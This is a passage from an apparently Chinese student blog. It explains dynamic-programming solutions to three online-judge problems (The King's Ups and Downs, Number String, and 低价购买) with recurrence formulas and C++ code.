<h4 id="the-kings-ups-and-downs"><a class="markdownIt-Anchor" href="#the-kings-ups-and-downs"></a> The King’s Ups and Downs</h4>
<p>题目链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0208">oj | The King’s Ups and Downs</a></p>
<p>主要是给出n个大小不同的数字，按照规则求排列的个数，排列满足要求：一个数字，它两侧的数字要么全部比它大，要么全部比它小。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211102232450.png" alt="图示1" /></p>
<p>看到题很懵逼，只能去看大佬的题解了。。。。</p>
<p>记录思路：假设这n个数是按照大小进行升序排列依次插入的话。当插入第x个人的时候，由于之前的排队序列只能是：低高低高低高…或者高低高低高低…两种中的一种。</p>
<p>由于新插入的这个人是最高的，它可以插入的空位有n个，假设它插入一个位置，前面有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>个人，后面有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>n</mi><mo>−</mo><mi>i</mi><mo>−</mo><mn>1</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;n-i-1\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>个人，则他前面的序列应该是高低结尾，后面的序列应该是低高开始。由此，假设前面<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>个人的排法数量为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;dp[i]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，则按照对称性，前面以高低结尾的数量为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mfrac><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><mn>2</mn></mfrac><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;\frac{dp[i]}{2}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">p</span><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>,同理后方的序列种数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mfrac><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><mn>2</mn></mfrac><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;\frac{dp[n-i-1]}{2}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">p</span><span class="mopen mtight">[</span><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，由此可以得出以下公式：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><msubsup><mi>C</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><mi>i</mi></msubsup><mo>∗</mo><mfrac><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><mn>2</mn></mfrac><mo>∗</mo><mfrac><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">dp[n]=\sum_{i=0}^{n-1}C_{n-1}^i*\frac{dp[i]}{2}*\frac{dp[n-i-1]}{2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.874664em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.305331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>这里要从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>n</mi><mo>−</mo><mn>1</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;n-1\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>个人中随机选出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>​个人放在前面进行排列。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">20</span>+<span class="number">1</span>;</span><br><span class="line">ll dp[N][<span class="number">2</span>];</span><br><span class="line"><span class="function">ll <span class="title">C</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//从x个人中选出y个人</span></span><br><span class="line">    <span class="keyword">if</span>(x==y||y==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">C</span>(x<span class="number">-1</span>,y)+<span class="built_in">C</span>(x<span class="number">-1</span>,y<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//dp数组预处理</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=dp[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>]=dp[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//放置第i个人时</span></span><br><span class="line">        ll sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i<span class="number">-1</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//前面有j个人</span></span><br><span class="line">            sum+=<span class="built_in">C</span>(i<span class="number">-1</span>,j)*dp[j][<span class="number">0</span>]*dp[i-j<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i][<span class="number">0</span>]=dp[i][<span class="number">1</span>]=sum/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">int</span> num,k;</span><br><span class="line">    ll res;</span><br><span class="line">    <span class="keyword">while</span> (p--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;num,&amp;k);</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>) res=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> res=dp[k][<span class="number">0</span>]+dp[k][<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %lld\n&quot;</span>,num,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="number-string"><a class="markdownIt-Anchor" href="#number-string"></a> Number String</h4>
<p>题目链接:<a href="http://124.71.166.97:5880/contest/22/problem/P0209">oj | 2021年算法设计与分析</a></p>
<p>这一题不会，放出别人的题解：<a href="https://blog.csdn.net/aaf76097/article/details/101586020?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link"> HDU 4055 Number String【DP递推+递推优化】【好题】_aaf76097的博客-CSDN博客</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span>	</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ms(a,b) memset(a,b,sizeof(a))</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">200010</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> pi = <span class="built_in">acos</span>(<span class="number">-1.0</span>);<span class="comment">//反余弦</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1010</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1010</span>][<span class="number">1010</span>];</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">1010</span>][<span class="number">1010</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s + <span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="built_in">strlen</span>(s + <span class="number">1</span>);</span><br><span class="line">		dp[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		num[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n + <span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;I&#x27;</span>)<span class="comment">//前面一个数比当前小</span></span><br><span class="line">				&#123;</span><br><span class="line">					dp[i][j] = num[i - <span class="number">1</span>][j - <span class="number">1</span>] % mod;<span class="comment">//for (int k = 1; k &lt;= j - 1; k++)</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;D&#x27;</span>)<span class="comment">//前面一个数比当前大</span></span><br><span class="line">				&#123;</span><br><span class="line">					dp[i][j] = (num[i - <span class="number">1</span>][i - <span class="number">1</span>] - num[i - <span class="number">1</span>][j - <span class="number">1</span>] + mod) % mod;<span class="comment">//for (int k = j; k &lt;= i - 1; k++)</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					dp[i][j] = num[i - <span class="number">1</span>][i - <span class="number">1</span>] % mod;<span class="comment">//for (int k = 1; k &lt;= i - 1; k++)</span></span><br><span class="line">				&#125;</span><br><span class="line">				num[i][j] = (num[i][j - <span class="number">1</span>] + dp[i][j]) % mod;<span class="comment">//记录前缀和</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num[n+<span class="number">1</span>][n+<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="低价购买"><a class="markdownIt-Anchor" href="#低价购买"></a> 低价购买</h4>
<p>题目链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0211">oj | 低价购买</a></p>
<p>看到题目，第一想到的是求一个最大下降子序列，这里直接用复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;O(n^2)\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>的上手就行了，可是第二问让输出最大购买次数对应的方案数，原先是将每一个最大次数对应的方案记录下来再进行比较的，但是得出的答案确实<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>W</mi><mi>r</mi><mi>o</mi><mi>n</mi><mi>g</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Wrong\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，回头仔细<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>D</mi><mi>e</mi><mi>b</mi><mi>u</mi><mi>g</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Debug\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>发现，观察以下的样例：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211109233637.png" alt="样例_低价购买" /></p>
<p>考虑我们之前对于每一个以数据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>结束的序列记录其序列长度，（这里我们只会记录一次），也就是说，看上面的样例，长度为4的最大下降子序列有</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>  </mtext><mtext>  </mtext><mn>69</mn><mo>−</mo><mn>68</mn><mo>−</mo><mn>67</mn><mo>−</mo><mn>62</mn><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mtext>  </mtext><mtext>  </mtext><mn>69</mn><mo>−</mo><mn>68</mn><mo>−</mo><mn>64</mn><mo>−</mo><mn>62</mn></mrow><annotation encoding="application/x-tex">(1) \;\;69-68-67-62\\
(2) \;\;69-68-64-62
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">6</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">6</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">2</span></span></span></span></span></p>
<p>两种序列，但是只记录了一种，所以出现了错误。通过上网查找资料，得到以下解决方法：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211109234519.png" alt="思路_低价购买" /></p>
<p>这样的话，我们再回头看之前的错误，在分别计算到67和64的时候都会记录自己的序列长度数组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;dp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>和方案计算的数组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;t[i]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" 